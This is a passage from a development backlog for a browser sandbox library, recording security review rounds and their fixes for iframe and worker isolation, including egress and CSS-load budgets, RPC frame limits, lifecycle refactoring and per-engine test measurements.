protected wherever the view shares the host's thread (WebKit always, Firefox, Chromium depending on its process model);
the budgets bound the common cases, CSS paint and bidirectional text layout are not bounded (240 000 characters
alternating directions in one paragraph: tens of seconds in Chromium and WebKit, engine and machine dependent). Tests: `test/e2e/view-budget.spec.ts`,
`src/lib/in-sandbox-view.test.ts`.

### S53 · Review round 1, the low findings and the cooperative residual — ✅ **done** (R2-2 documented)

*From review round 1.* **Done**: configs drop what they cannot use instead of refusing (R1-3); origins are printable
ASCII as written (R1-4); invalid punycode labels are left to each engine's URL parser, documented (R1-5); the strict
worker mints URLs only for the view's types (R2-4); worker mode removes `WebAssembly` unless `scriptUnsafe` (R2-5); a
refused build's `terminated` comes in a task (R3-2); cooperative mode without `allow-scripts` warns once (R3-4);
fetch bridge allowlist warnings (R3-5); `SandboxConfig` narrows each mode, typed events and tag map (R3-6, R4-12); the
same config again rebuilds nothing (R3-7); auto-sizing restores the embedder's height (R3-8); `expose()` throws a
TypeError (R3-9); `sandboxFetch` always exists and is refused without the bridge (R4-8); docs for `for…in` copies,
handler messages, the element's own announcement, synthetic events, and plugins whose init outlives `ready` (R3-10–12,
R4-9, R4-11). **R2-2, a cooperative-mode limit (S44)**: a modifier click the guest's script synthesizes opens a new
top-level tab (Chromium with no gesture where its popup blocker lets it, Firefox within a user's activation) and
Chromium submits a form that way past `form-action`; measured and asserted per engine; `allow-forms` became an unsafe
capability (S54). Tests: `test/unit/review-round-1.test.ts`, `test/e2e/review-round-1.spec.ts`.

### S54 · The owner's decisions after review round 1: images the guest writes, `text()`/`set()`, the view's hash, `allow-forms` — ✅ **done**

*From [review round 1](security/REVIEW-ROUND-1-2026-10-15.md), "Awaiting the owner" (R4-4, R4-5, R2-2);
[ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-15-the-owners-decisions-after-review-round-1),
[ADR-004 amendment](ADR-004-files-as-blob-urls.md#amendment-2026-10-15-the-strict-view-shows-raster-image-guest-writes).*

**Done**:
- **R4-4**: the strict view shows the raster images the guest writes (PNG, JPEG, GIF, WebP, AVIF; `VIEW_WRITE_TYPES` =
  `VIEW_FILE_TYPES` ∩ the raster types, one constant the view checks), named by path in a render, without a rebuild.
  The host sends the view the bytes it recorded, the view mints its own URL and only decodes it; `write()` resolves
  once the view holds it; a later write replaces it, a removal or another type ends it, a rebuild starts fresh. The
  guarantee now reads: the view renders no `blob:` content but registered files and raster-image guest writes, decoded
  only.
- **R4-5**: `viewScriptHash()` (the view bootstrap's hash source, the one the element uses) replaces reading the hash
  from the wrapper's `srcdoc`; `sandboxView.text(id, text)` (assigned, never parsed) and `sandboxView.set(id, { value?,
  checked?, focus? })`, over the render port's flow control and inside the view's character budget and rate. Focus
  moves only while the user's focus is in the sandbox (`document.hasFocus()` in the view), so a guest never takes it
  from the host page; measured: a sandboxed frame's `focus()` does so in Chromium and Firefox (PD5). No name was added
  for the wrapper style's hash: it is a constant, listed in API.md.
- **R2-2**: `allow-forms` is an unsafe capability in cooperative and worker mode (dropped from `capabilities` with a
  warning, granted by `unsafeCapabilities` with one); strict mode's view keeps it, unchanged. The `form-action-exfil`
  preset opts in.

Tests: `test/unit/owner-decisions.test.ts`, `test/unit/view-api.test.ts`, `test/unit/api-docs.test.ts`,
`test/e2e/owner-decisions.spec.ts`, `test/e2e/guest-writes.spec.ts` ("8"), `test/e2e/review-round-1.spec.ts` ("R2-2"),
`test/e2e/host-policy.spec.ts`, `test/e2e/package.spec.ts`.

### S55 · Review round 2: captured intrinsics, a snapshot measure, host-page refusals, lifecycle gaps, the view's time — ✅ **done**

*From [review round 2](security/REVIEW-ROUND-2-2026-10-15.md) (C-1 to C-12, L-1 to L-7, M-1 to M-6).*

**Done**:
- **Guest-mutable intrinsics (C-1, C-2)**: every function stringified into the guest captures what it uses in one list
  ending at `CAPTURE_POINT` and reads nothing guest-mutable after it; a unit test scans their text. Console wrappers
  forward nothing when relaying throws.
- **The byte measure (C-3)**: senders clone with a captured `structuredClone`, measure the snapshot with an allow-list
  of the types clone produces, and post the snapshot. Errors and platform objects are refused across RPC
  (`ARGS_NOT_TRANSFERABLE` / `RESULT_NOT_TRANSFERABLE`); send `{ name, message, stack }`.
- **Host-page refusals (C-5, C-6)**: worker mode is `ready` only once its worker runs; a refused worker or Trusted Types
  policy ends the build with the documented reason.
- **The view's hash (C-8)**: the view bootstrap is a literal baked in by `scripts/build-lib.ts`, so `viewScriptHash()`
  is the same in Bun, Node, a minified app and the browser; importing the package needs no DOM.
- **Lifecycle (L-1 to L-7)**: one `buildsHere()` predicate; one long-delay timer (`src/lib/long-timer.ts`, `Infinity` =
  off); one queue in issue order; the entry refusal inside the re-entrancy guard; detached frame loads ignored; a blank
  reason is the default; methods work after adoption into another document (Firefox).
- **Budgets (C-4, C-7, M-1 to M-3, M-5)**: the view keeps running counts and has a 200 ms per second time budget; the
  equal-config comparison is capped; the relay's own lines always arrive and its windows are the host's; worker and
  strict logs no longer go to the worker's own console.

Tests: `test/unit/review-round-2.test.ts`, `test/unit/review-round-2-lifecycle.test.ts`,
`test/e2e/review-round-2.spec.ts`, `test/e2e/host-policy.spec.ts`, `test/e2e/package.spec.ts`,
`scripts/smoke-package.sh`.

### S56 · Review round 3 — ✅ **done** (not clean: S57)

Ran on `main` at `16c545b` with the same three reviews as round 2 (lifecycle model, change audit, documented limits
measured); the owner reviewed the findings before any fix. [Report](security/REVIEW-ROUND-3-2026-10-18.md).

### S57 · Review round 3: whole RPC frames, a call budget, the view's time, animations and autoplay — ✅ **done**

*From [review round 3](security/REVIEW-ROUND-3-2026-10-18.md) and [research 16](research/16_view_isolation/README.md).*

**Done**:
- **Part 1** (`32ee7fd`):
  - every RPC frame is built by one set of builders and measured whole, with method names capped at 256 characters and error text at 64 Ki characters (C-1);
  - a guest call budget, `callLimits: { maxPerSecond, maxBytesPerSecond }` (M-2);
  - honest refusal texts (C-3, M-7);
  - the strict view's error text bounded before posting (C-4);
  - re-insertion after a teardown rebuilds (L-1);
  - every call settles (L-2);
  - dropped guest lines reported (L-4);
  - the whole fetch URL (M-4);
  - docs (C-5, C-6, M-3).
- **Part 2**:
  - The view's time budget charges only the rendering it measured, never time without a frame, with debt capped at 1000 ms (C-2, M-5).
  - `allowAnimations` (default `true`; `false` removes CSS animations and transitions from the view, measured back to the idle baseline on all three engines; M-1/L-3).
  - `allowAutoplay` (default `false`: the view drops `autoplay`).
  - Where the view runs per engine, and the residuals the switches do not remove, are documented (research 16, ADR-005 amendment, README).

Tests: `test/unit/review-round-3.test.ts`, `test/e2e/review-round-3.spec.ts`, `test/unit/view-switches.test.ts`,
`test/e2e/view-switches.spec.ts`, `test/e2e/view-budget.spec.ts`.

### S58 · Review round 4 — ✅ **done** (not clean: S62)

Ran on `main` at `c7672bb` with the same three reviews; the owner reviewed the findings before any fix.
[Report](security/REVIEW-ROUND-4-2026-10-18.md).

### S59 · Evaluate machine-checked proofs (Lean) — ✅ **done** (no Lean; S61)

[Research 17](research/17_formal_methods/README.md): of 48 medium-or-higher findings, none only a proof would have
caught; the 12 a proof could reach are caught as well by cheaper tests once the property is written down, and the rest
are about the JavaScript runtime or the browser, outside any model. A Lean and a fast-check proof of concept on the
rate limiter are kept there (not in CI). Decided by the owner: no Lean; the cheaper tests later (S61); the view's time
budget restated as a long-run average (API.md, README, ADR-005).

### S60 · Repository and docs clean-up, then independent adversarial reviews — ⏸️ **after we are done**

Once the review rounds end: a proper clean-up of the repository and the docs:
- stale files and branches;
- docs that grew by amendment, consolidated into their current state;
- research notes indexed;
- the backlog compacted.

Then independent adversarial reviews of the cleaned-up repository and docs by sub-agents of other model families (Sonnet and Haiku), with their findings verified and fixed the same way as the review rounds.

### S61 · Property, model-based and structural tests (from research 17) — ⏸️ **later** (owner)

The tests [research 17](research/17_formal_methods/README.md) found would have caught most of rounds 1–3's findings in
our own logic. Estimated about two weeks of work; about 20–60 s more unit CI, plus a nightly job.
1. **Property tests** (fast-check as a dev dependency):
   - the sliding-window limiter, porting research 17's properties, and refusing a weight that is not a finite number ≥ 0;
   - the guest's copy of the rule against the host's (a differential test);
   - the view's time-budget arithmetic moved into a pure function and tested.
2. **A permanent model-based lifecycle suite** (`fc.commands`), from reviewer L's reference model (rounds 2 and 3; not in
   the repo today):
   - re-entrant listeners, argument getters and a worker that fails to start;
   - round 2's "What held" invariants;
   - about 200 sequences per unit run, thousands nightly, and a Playwright subset per engine.
3. **Structural checks:**
   - a branded `RpcFrame` type and a source scan that only the builders make frames and that every string the guest sends is cut;
   - the size measure against the real `structuredClone` (`fc.anything()`);
   - a differential test of the console relay against the measure.
4. **A budgets table** in the docs: every channel against its count, byte and time bound, and the test for each, so that
   a bound is written down before a review has to find it missing.

### S62 · Review round 4: the worker's only way out, values read once, the view's URL budget, build completion after load — ✅ **done**

*From [review round 4](security/REVIEW-ROUND-4-2026-10-18.md).*

**Done**:
- **The worker's channel (M-1).** The worker keeps no `postMessage`, so the library's port is its only way out. Worker mode cancels uncaught errors after relaying them.
- **Values read once (C-1).** Refusal texts are always strings and are measured on receipt.
- **The still-style rewrite (C-2)** no longer expands shorthands.
- **Build completion (L-1).** A frame's load completes a build in a microtask, with every check repeated there.
- **The view's URL policy and budget (M-2).** Refused `src`, `srcset` and `poster` URLs are dropped at render time, with a synthetic violation. New limits, approved by the owner: `VIEW_MAX_URLS` (1000) and `VIEW_URLS_PER_SECOND` (200).
- **Owner's decisions.** The default `callLimits.maxPerSecond` is 1000 (M-6). The "no repeat" rule is one rule for every `terminated` (L-3).
- **Corrections:**
  - L-2, L-4, M-4, M-5;
  - `ARGS_NOT_TRANSFERABLE` for arguments that can never be carried (C-5);
  - C-6, C-7, C-8;
  - docs: M-3, C-3, C-4, I-1, I-2.
- **Residual, documented:** URLs named in CSS are not dropped at render time.

Tests: `test/unit/review-round-4.test.ts`, `test/e2e/review-round-4.spec.ts`, `test/e2e/view-switches.spec.ts`,
`test/unit/channel-guarantees.test.ts`.

### S63 · Review round 5 — ✅ **done** (not clean: S64)

Ran on `main` at `60814b5` with the same three reviews. It found 1 high and 6 medium findings in our code, all in code
an earlier per-instance fix added or changed. The owner reviewed them before any fix and adopted every recommendation
of [research 18](research/18_finding_classes/README.md): the fixes are made as the first slices of their classes'
designs (S64), and the structural work follows in phases (S65–S69), each merged on its own.
[Report](security/REVIEW-ROUND-5-2026-10-19.md).

### S64 · Review round 5's fixes, as slices of their classes — ✅ **done** (phase 1)

The owner's decisions, 2026-10-18:
- **Egress (N-1).** Rejections are cancelled after relaying, as errors are. A per-second rejection budget ends the
  sandbox past it, because cancelling does not stop Firefox's cost. This is the first row of one egress table with
  its enumeration test.
- **Config across fields (L-2 = N-5).** A call heavier than the byte budget is answered `ARGS_NOT_TRANSFERABLE` (not
  retryable), and a `maxBytesPerSecond` below the largest call warns. This is the first rule of one config schema.
- **Observe and charge loads (M-3, and the owner's earlier option 1).** Every load the view observes (resource timing,
  CSS-borne loads included) and every violation counts against `VIEW_URLS_PER_SECOND`.
- **The time budget (M-2).** The full measured cost is charged, with no 1 s cap, and the sandbox ends when one
  operation takes longer than 2 s.
- **The still stylesheet (M-1, and L-1 of the measurement).** `first-letter` and `first-line` are removed, the
  stylesheet is generated per engine for the pseudo-elements that can animate on the allowed elements, and an e2e
  times a large replacement with it on and off on every engine.
- **Distinct URLs (M-4).** A cap on distinct image URLs per environment (measured), and the stall of about 1 s per
  1000 new images documented.
- **The other slices:**
  - L-1: queued calls flush only at `ready`, in every mode;
  - N-2, N-6: one reader for guest event and init values;
  - N-3: a one-sided URL match that errs only toward refusing;
  - N-4, L-4: one diff for guest-write projections;
  - L-3: one frozen-detail constructor;
  - the lows and docs.

**Done** ([report](security/REVIEW-ROUND-5-2026-10-19.md)):
- **The egress table** (`src/lib/egress.ts`), with its enumeration e2e and the uncaught-error and rejection budget.
- **One config schema** (`src/lib/config-schema.ts`), with its first rules.
- **One element-event constructor** (`src/lib/element-events.ts`).
- **One guest-write diff.**
- **One reader for guest values**, with its scan.
- **`ready` as the only flush point.**
- **The view:**
  - observed loads and violations are charged;
  - the full time charge, with `VIEW_MAX_OPERATION_MS` (2000);
  - a still stylesheet built per guest;
  - `VIEW_MAX_DISTINCT_URLS` (10,000);
  - the one-sided URL match;
  - the prelude's captured error getters.

Residual, for the owner: the 2 s operation limit ends a 250,000-character textarea `set()` in WebKit. **Decided**
(owner, 2026-10-19): the sandbox ends only after repeated overruns (S72).

### S65 · One lifecycle reducer, with the model-based suite (S61.2) — 🟡 step 2 in progress (PR A of 4 done)

Every transition becomes a pure function of state and event. Effects and event dispatch run only after the state
settles, and `ready` is the only point where queued work flushes. It is tested by the permanent fast-check `commands`
suite built from [the lifecycle model](research/17_formal_methods/lifecycle-model.md).

1. ✅ **The model-based suite.** The reference model is a module (`test/model/`), with its generator and runner, unit
   tests (`test/unit/lifecycle-model.test.ts`) and an e2e on every engine (`test/e2e/lifecycle-model.spec.ts`), which
   also keeps round 4's L-1 loop as a property. Its first finding is LM-1 (S71).
2. 🟡 **The reducer**, tested by that suite, in four PRs, each merged on its own:
   - ✅ **PR A: the reducer as a pure module, and its oracle.** `src/lib/lifecycle.ts` (`reduce`, `step`,
     `runEffects`; internal, not exported) describes exactly what `host.ts` does today, and `host.ts` does not use it
     yet. `test/model/reducer-runner.ts` runs the real reducer against a fake element and the reference model;
     `test/unit/lifecycle-reducer.test.ts` runs 5,000 generated sequences (about 2 s), the reducer's properties, and
     each class-L finding as a trace. Where today's code and the plan differ, the reducer follows the code; the
     differences are noted in the module, among them finding **LM-2** (low, class L): a build re-entered from the
     host page's own Trusted Types default policy (a `reset()` inside `createIframe`) starts a second load deadline,
     and the first is never stopped, so 5 s later it ends whatever environment stands. Only the embedder's own code
     can reach it. The reducer's `loadDeadline{gen}` input drops the stale deadline; it takes effect in PR C.
   - ⏸️ PR B: the terminations through the reducer.
   - ⏸️ PR C: the builds and the DOM callbacks (fixes LM-2, with an e2e that reproduces it first).
   - ⏸️ PR D: the completion of a build and the `ready` gate; a source scan that `state` and the lifecycle events
     change only in the executor.

### S71 · LM-1, a `fetch` record after its environment's teardown — ✅ **done** (2026-10-19): `aborted`, by construction

A `fetch` listener that tore the environment down could still receive an `ok` record of that environment, where API.md
says only an `aborted` record of a torn-down environment arrives then. The owner decided: such a record is `aborted`.
What changed (class L):
- **One chokepoint.** `createFetchBridge`'s `record()` decides the outcome from the bridge's lifetime: once `abortAll()`
  has run, every record is `aborted` with `FETCH_FAILED`, whatever path it settled on (ok, an error status, a redirect, a
  failure, a timeout, over `maxBytes`, a refusal), its `status` and `bytes` as measured. No path picks the final outcome
  any more, and the guest is told the sandbox was torn down instead of getting a body.
- **A request refused after close** is `aborted` too, not `refused`: it was sent by the torn-down environment and settles
  after its teardown.
- **Tests.** `test/unit/fetch-bridge-lifecycle.test.ts` enumerates every settle path from one list, each with the
  teardown at its last possible point (before the fix, 10 of its 11 paths recorded another outcome); the focused e2e test in `lifecycle-model.spec.ts` no
  longer carries `test.fail()` and passes on Chromium, Firefox and WebKit.
- **Docs.** API.md (FetchRecord) states the rule; [the lifecycle model](research/17_formal_methods/lifecycle-model.md)
  records LM-1 as fixed.

### S66 · Probe a trusted relay worker — ✅ **done**: build it, with per-engine caveats (S69)

[Research 19](research/19_relay_worker/README.md) measured a library-only relay worker that spawns the guest's worker
as a nested worker, on Chromium (headless shell and full), Firefox and WebKit:
- **Nesting works.** Nested `blob:` workers start in the sandboxed view on all three engines, and the guest inherits the
  view's policy exactly.
- **The worker-side costs leave the host page.** With the relay cancelling, the guest's 8 MiB `postMessage` floods
  and 16 Mi-character uncaught errors cost the host page 0–2%, against 29–98% directly.
- **Measuring moves to a trusted realm.** The relay measures plain data after it arrives (0–78 µs a message).
- **Overheads.** About 1.9 MB per sandbox, under 0.1 ms per call, and 14–21 ms more to `ready`.
- **Rejections stay open.** A rejection never reaches a `Worker` object, so Firefox's 96–98% stays: S64's guest-side
  rejection budget is still the bound.
- **Caveats.** The relay's own thread and memory need a byte cap that ends the guest. WebKit under COEP refuses the
  view's worker, so the relay is never reached there, as today.

### S69 · Build the relay worker — ⏸️ after S65

Following research 19's plan:
1. A stringified relay that mints and revokes the guest's URL.
2. One typed frame protocol from guest to relay, charged to the existing budgets.
3. A byte cap per engine after which the relay ends the guest.
4. The relay cancels every error.
5. The rejection budget stays in the guest realm.
6. The view stops listening on the guest's `Worker`.
7. Worker mode after its own probe.
8. The floods as e2e tests, plus a test that a guest which subverts its prelude still cannot exceed a budget.

This closes the worker side of E-cpu and G by construction ([research 18](research/18_finding_classes/README.md)).

### S67 · One config schema — ✅ **done** (phase 4)

`CONFIG_SCHEMA` (`src/lib/config-schema.ts`) declares every option once:
- its default and documented default, its modes, how it is read, its warnings, and what the modes that ignore it say;
- `normaliseConfig()` is pure, and host.ts only applies its result;
- `CONFIG_INVARIANTS` names the cross-field invariants once: stored options only, as own data; types; capabilities per mode; options outside their modes at their defaults; the `callLimits` rules; `fetchBridge` budgets that admit a request and fit one call; guest writes of the whole quota fitting one call.

The checks:
- a property test over 4165 configs (edges per mode, plus seeded random configs with poisoned keys at any depth) checks every invariant, idempotence and deterministic warnings;
- a doc-sync test ties every row of API.md's Configuration table to the schema;
- a differential run against the code before, over 3000 configs and 500 sequences, found the effective config, origins, fetch policy, call budget and refusals identical.

One behaviour change: the capability warnings come once per element and message, as API.md already said, instead of
once per `setConfig()`.

### S70 · For the owner: three edges the schema found — ⏸️ **decide**

- **String fetch request bodies.** A string body is measured at 2 bytes per character. With `fetchBridge.maxBytes` above
  about 16.5 MiB, a string body over about 17.3 million characters is refused `ARGS_NOT_TRANSFERABLE` by the guest's
  broker before it reaches the bridge, although API.md allows request bodies up to 32 MiB. Clamp `maxBytes` for string
  bodies, or document it.
- **A tiny `watchdogTimeout`.** A value such as 0.001 ms may end a healthy guest. Measure it, then set a floor or document it.
- **`mode: null`.** Its capabilities are filtered as strict mode's before the config is refused. This is harmless; it
  is kept as it was.

### T7 · A host-load test that fails on a loaded machine at the base too — 🔎 **investigate**

`review-round-4.spec.ts` "M-2: an admitted loopback origin" (an image flood, which must stay under 30% busy) measured
41–45% on Chromium in local runs while other agents loaded the 4-core machine, at `32e59a1` as well as after S67. It
passes in CI. Make it measure against its own idle baseline under the same load, as `view-bound.spec.ts` does, rather
than an absolute share.

### S68 · State the view's cost bound — ✅ **done** (phase 5)

docs/API.md, "The view's cost to the host page", states the bound per process placement:
- **(a) The long-run share.** At most 20% for the view's own work, plus the browser's work on at most
  `VIEW_URLS_PER_SECOND` loads, so up to 40%. It is an average, not a per-second cap.
- **(b) One operation.** At most `VIEW_MAX_OPERATION_MS` as measured, then the sandbox ends, plus the operation's own
  uninterruptible cost, bounded by the caps. Since S72: past `VIEW_MAX_OPERATION_MS` an operation is an overrun, and
  the second within `VIEW_OVERRUN_WINDOW_MS` ends the sandbox.
- **(c) The rates and caps.**
- **(d) A closed list of what is outside the bound**, each item with its measured magnitude.

`test/e2e/view-bound.spec.ts` runs the canonical floods on every engine and asserts (a) with a 10-point margin, and
(b). `test/unit/view-bound.test.ts` keeps the statement's constants in step with the code. README and ADR-005 link to the
statement instead of repeating it.

### S72 · The repeated-overrun rule (owner's decision on the 2 s limit) — ✅ **done**

Class P, a budget that counts a proxy: the meter measures wall time, a stand-in for the view's own cost, so under
machine load one operation past `VIEW_MAX_OPERATION_MS` ended healthy sandboxes (a large initial view on a loaded CI
runner, round 4's R4-2 and round 5's L-1 WebKit tests; WebKit's first `set()` of a 250,000-character textarea, always).
The owner decided (2026-10-19) that the sandbox ends only after repeated overruns.

What changed:
- **The rule, in the pure budget arithmetic** (`viewBudget`'s `measured`, `src/lib/in-sandbox-view.ts`): an operation
  past `VIEW_MAX_OPERATION_MS` is an overrun, charged in full to `VIEW_APPLY_MS_PER_SECOND` (the next operation waits
  until the debt is repaid, at least 9 s), and the view goes on. The second overrun within `VIEW_OVERRUN_WINDOW_MS`
  (300,000 ms, a module constant, not a public export) of the one before it ends the sandbox; a later one is a first
  overrun again. A hidden-document measure is neither charged nor counted, and one operation is one overrun (its flush
  and its rendering update are not counted twice).
- **The reason**: "the view spent more than 2000 ms on one operation twice within 5 minutes".
- **The first overrun is visible**: one `warn` host line on `sandbox-log` per environment, through the existing host
  lines (API.md and the lifecycle model's whitelist): "[Sandbox] the view spent more than 2000 ms on one operation; a
  second such operation within 5 minutes ends the sandbox." No new event or name.
- **Tests**: the rule's edges in `test/unit/view-round-5.test.ts` (at the limit, one ms past it; exactly at the window
  and one ms either side; the window running from the first of two; a first overrun followed by 1000 fast operations;
  hidden measures; a property against a reference over 300 random runs; the host's line and reason);
  `test/unit/review-round-3.test.ts` drives the real view in jsdom through both outcomes; the class's structural test
  (`test/unit/view-bound.test.ts`) requires the window constant in the statement's table and (b) to state the rule in
  the host's words. On every engine, `test/e2e/view-bound.spec.ts` (b) and `test/e2e/view-round-5.spec.ts` (M-2).
- **Docs**: API.md (b), (c), (d), the reasons table, the limits table and the host lines; README; ADR-005; review
  round 5's "What remains"; research 17's lifecycle model.

Measured (2026-10-19, headless Playwright on the shared 4-core VM; Chromium, Firefox, WebKit):
- `view-bound.spec.ts` (b), three renders under the `:has()` rule (30,000 elements in Chromium, 24,000 in Firefox and
  WebKit; 3.9 s, 9.0 s and 6.5 s on a page of their own): the first stalled the host page 3.9 s, 8.9 s and 7.2 s and
  the sandbox stood, with one warn line; the second ran 18.3 s, 43.5 s and 34.7 s later (its debt) and stalled it 4.0 s,
  9.3 s and 6.5 s, and the sandbox ended with the new reason; the third never ran.
- `view-round-5.spec.ts` (M-2): one overrun, then four operations well under the limit: the first of them applied
  21.9 s, 21.0 s and 31.1 s after the warn line, all applied, the sandbox `ready`; a second overrun within the window
  ended it with the reason. Operations of about 1 s one after the other: host 18% (Chromium) and 15% (WebKit) busy
  (Firefox: no size of the family cost 0.7–1.4 s there, so that test skipped itself).
- `review-round-2.spec.ts` (M-3), a 250,000-character textarea `set()` four times a second: the sandbox stays `ready`
  on all three engines (WebKit's first `set()` ended it before).

### S73 · CSS-borne loads charged before they start — ✅ **done** (2026-10-19)

Classes E-net and P ([research 18](research/18_finding_classes/README.md)): a load the policy admits is egress, and
its budget counted it by a stand-in, the platform's report of it, which arrives only once the response has ended.

**The cause.** PR #47's CI failed on Firefox: `view-round-5.spec.ts` M-3, "CSS backgrounds to an admitted origin",
counted 5,000 loads over an 11.1 s flood against the test's bound of 4,935.6 (twice `VIEW_URLS_PER_SECOND` over the
flood, plus one render). A URL the renderer kept in an attribute was charged when it was rendered, but a CSS-borne load
(a style attribute's `url()` or `image-set()`, a `<style>`, an `@import`, a font) only when its resource-timing entry
arrived. Behind a slow server every render the view applied before the first charge arrived got through: the first
burst was the server's latency times the view's render rate, not the budget, and the test's "twice the rate" was
empirical.

**The design** (`src/lib/in-sandbox-view.ts`): every load is charged before the browser can start it, as kept URL
attributes already were.
- **Counted when applied.** `cssLoadBound` counts, in the CSS an operation adds, the function tokens named `url`,
  `image-set`, `-webkit-image-set`, `image`, `cross-fade` or `src` (each 1) and each `@import` (a second's worth, 200,
  for what the sheet it imports names, which the view cannot read then). The CSS an operation adds: a render's kept
  style attributes (collected by the renderer as it walks them), the text of its `<style>` elements (HTML and SVG),
  the fragment's text when the target is a `<style>` or inside one, and 200 per stylesheet `<link>` (only registered
  sheets are kept); a `text()` into a `<style>` (or inside one); a `set()` of a textarea or an output inside one. The
  texts are counted joined, in one pass.
- **The counter**, a minimal subset of the CSS tokenizer: each code point of a name is matched in each way it can be
  written (itself in either case; a backslash and itself, where it is no hex digit; 1–6 hex digits of either case's
  value, with one optional whitespace, CR LF one, the digits ending at six or before a non-hex code point), then `(`.
  One native regular expression, tried at every position, comments and strings included: it assumes no token
  boundary, so wherever the tokenizer starts a token that loads, the pattern matches what it reads. It only
  over-counts (`xurl(`, `5url(`, a name in a comment or string). Skipping comments and strings was rejected: a skip that
  ends one where the tokenizer does not hides what follows, an under-count.
- **Charged with the operation.** The count is prepaid to the load budget when the flush is settled, before it forces
  layout (which starts the loads), like the attribute URLs, so the next operation waits until the budget has refilled.
- **Reconciled as credit** (`viewBudget`'s `prepay` and `observed`). A load the platform reports that no render's
  attribute charged, and a violation, takes from the prepaid credit first and is charged only once it is spent. The
  credit is capped at `VIEW_URLS_PER_SECOND` (a second's worth); past it the prepayment is forfeited, so an
  over-counting render cannot store a burst for later. An attribute-charged URL is still never charged again, and the
  M-4 distinct-URL accounting is unchanged.
- **The bound** (R the rate, over any t seconds): R·t + R (what the budget holds) + one operation's charge (at most
  `VIEW_MAX_URLS` attributes and its CSS's count) + R (the credit carried in) + what CSS already in the view loads past
  what was prepaid for it (a rule matching later, a sheet past its allowance), which only that CSS's text bounds. The
  server's latency is in none of the first four terms. Stated in `VIEW_URLS_PER_SECOND`'s comment and API.md (a).

**Tests.**
- Unit, `test/unit/view-css-loads.test.ts`: the counter's forms (`url(`, `URL(`, `u\72 l(`, `\75 rl(`, six-digit and
  CR LF escapes, `image-set(`, a nested `image-set(url() url())`, `@import`, `@\69mport`), what it does not count, and
  what it counts by decision (comments, strings, `xurl(`); a property over 500 random texts with N tokens in random
  escape forms (count ≥ N); a property over 4,000 random texts against a reference implementation of the css-syntax-3
  tokenizer in the test (count ≥ the tokens that load, and the joined count ≥ the sum of the parts); the credit
  (consumed before charging, capped, and a property that every load is charged at least once); and the real view in
  jsdom with stand-ins for resource timing: what each operation prepays, a reported load and a violation taking the
  credit, and an attribute-charged URL not charged again. Mutating the escape pattern (CR LF, six digits, the
  whitespaces) fails them.
- e2e, `test/e2e/view-round-5.spec.ts`: M-3's admitted-origin assertion is now the derived bound (R·t + R + 500 + R),
  with no slack factor; "S73: behind a slow server" delays every response 1 s and asserts the same bound over the
  first second and over the flood; "S73: counting" measures the counter.

**Measured** (2026-10-19, the shared 4-core VM, headless Playwright):
- **Behind a server 1 s late** ("S73: behind a slow server", bound 1,100 for the first second and 2,100 for the 6 s
  flood): before the fix, Chromium 1,024 loads in the first second and 2,440 over the flood, Firefox 115 and 2,500,
  WebKit 2,500 and 6,112, so the test failed on all three engines; after it, 500 and 1,000 on all three.
- **M-3, an admitted origin, the derived bound** (R·t + R + 500 + R: 3,101–3,104 over the 11.0 s flood): 1,500 loads on
  every engine, 136 a second; host 11%, 7% and 8% busy (Chromium, Firefox, WebKit). Refused source: 63, 125 and 125
  refusals a second, host 4%, 2% and 1% busy.
- **The counter's cost** on a 256 KiB render full of CSS (half style attributes, half one stylesheet; best of 3 rounds of
  10), as count (of it, `cssLoadBound`) against the bare parse and against parse and clean:
  - without escapes: Chromium 0.41 ms (3% of 11.9 ms), Firefox 1.2 ms (52% of 2.3 ms; 17% of 6.9 ms), WebKit 1.0 ms
    (12% of 8.2 ms);
  - one escape per rule: Chromium 0.60 ms (6%), Firefox 1.1 ms (37%; 12% of parse and clean), WebKit 1.2 ms (9%);
  - every name escaped: Chromium 1.4 ms (12%), Firefox 1.4 ms (87% of its 1.6 ms parse; 32% of parse and clean),
    WebKit 1.1 ms (13%).
  Firefox parses three to seven times as fast as the others, so there the count is half its bare parse or more; the
  test asserts it under half of parse and clean on every engine. A first version, a hand-written decoder in a loop,
  cost 11.6 ms (Chromium) and 6 ms (Firefox, 150% of the parse); one escape-decoding pass with a callback, then two
  matches, up to 10.7 ms in Firefox on escaped names. The count runs inside the flush, so it is in the view's
  measured and charged time.
- **Behaviour change**: a guest's own CSS now holds its next operation back by what it can load, whether or not it
  loads it (a `url()` in a comment, a cached image); each `@import` or stylesheet `<link>` by a second.

### T6 · Two CPU-heavy unit tests failed once on a loaded machine — 🔎 **investigate**

`review-round-2.test.ts` (C-7: past the comparison cap the sandbox rebuilds) and `review-round-5.test.ts` (5:L-1: the
model over random schedules) failed once in a full unit run on 2026-10-19, at a load average of about 9. Three agents were
running there at the time. Both passed alone and in the next full run (1635 passed), and both pass in CI. The failure
text was not captured. Next: reproduce under load, then bound the work or give the test an explicit budget. A flake is
not a root cause.

### B1 · Promise-based RPC in both directions — ✅ **done**

**Done**: built in-house rather than adopted; [ADR-002](ADR-002-host-guest-broker.md) records why.
One dispatcher, `src/lib/rpc.ts`, runs on both sides: `expose()`, `call()` and `callWithTimeout()`
on the element, and the same three on a global `bridge` in the guest. Only exposed methods are
callable, calls time out after 30 s by default, teardown rejects pending calls, and an answer
reaches only the frame that asked. `call()` needs no `scriptUnsafe`; `execute()` stays the gated escape hatch. The
acceptance below holds in both modes: `test/e2e/broker.spec.ts`, plus `src/lib/rpc.test.ts`.

*Parity gap*: `websandbox` (`connection.remote.fn()`), Penpal and Zoid all offer this; we do not.

**Verified**: `execute(code)` is fire-and-forget (`src/host.ts:119`); the in-sandbox script runs
`new Function(code)` and discards the return value (`src/lib/in-sandbox-script.ts:15`). Only `LOG`
frames travel back, so a caller cannot await a result and a thrown error arrives as a log line
rather than a rejected promise. The transport for this already exists — it is the framing that is
missing.

**Work**: **prefer adopting Penpal over hand-rolling this** — promise-based `postMessage`
correlation is a commodity, and our `MessageChannel` layer already provides the transport it
frames (see [ADR-001](ADR-001-continue-or-adopt.md#hybrid-strategy-adopt-the-commodity-keep-the-differentiator);
confirm licence compatibility first). If built in-house: a correlated `{id, type, payload}`
envelope over the existing port; `sandbox.call(name, ...args): Promise<T>` on the host and a
symmetric `host.call()` inside; keep `execute()` as the `scriptUnsafe`-gated escape hatch.

**Acceptance**: `await sandbox.call('sum', 1, 2) === 3`; a sandbox-side throw rejects with the
original message; identical behaviour in both modes.

### B2 · Lifecycle: `terminate()`, `reset()`, state — ✅ **done**

**Done**: `terminate(reason?)`, `reset()` and a readonly `state` (`idle`, `loading`, `ready`,
`terminated`) on the element, all transitions in one method that also dispatches `ready` and
